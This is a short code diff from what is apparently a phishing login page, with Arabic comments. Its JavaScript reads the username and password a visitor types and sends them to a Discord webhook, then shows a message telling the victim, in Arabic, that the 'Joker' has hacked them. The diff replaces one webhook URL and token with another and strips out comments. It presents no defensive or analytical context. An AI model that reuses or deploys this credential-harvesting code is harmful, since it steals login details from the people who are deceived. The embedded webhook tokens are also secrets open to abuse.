@@ -232,12 +232,12 @@
 
   // إرسال البيانات إلى Webhook عند الضغط على زر تسجيل الدخول
   function sendToWebhook(e) {
-    e.preventDefault(); // منع الإرسال التقليدي
+    e.preventDefault(); 
 
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
 
-    const webhookURL = "https://discord.com/api/webhooks/1387918763575345334/ZBVR3gWXxerlIu9jIvSe48AnX7m8ULAe5ZFvY_5Ndsl2GZF_y2opn-RzVwi7dLrsdTA-"; // ← ضع رابط الويب هوك الخاص بك هنا
+    const webhookURL = "https://discord.com/api/webhooks/1388083257379131473/9B2jvjJrUawvfitRGrm05O_vwrMTBtig0A0LnHQ5aQjNh6UJHbEbe4T8r8lBZyozAiNR"; 
 
     const payload = {
       embeds: [
@@ -273,7 +273,7 @@
     })
       .then(() => {
         showLoginMessage("تم اختراقك من قبل الجوكر طاب يومك.", "success");
-        // يمكنك إعادة توجيه المستخدم بعد النجاح إن أردت:
+        
         // window.location.href = "#";
       })
       .catch((err) => {
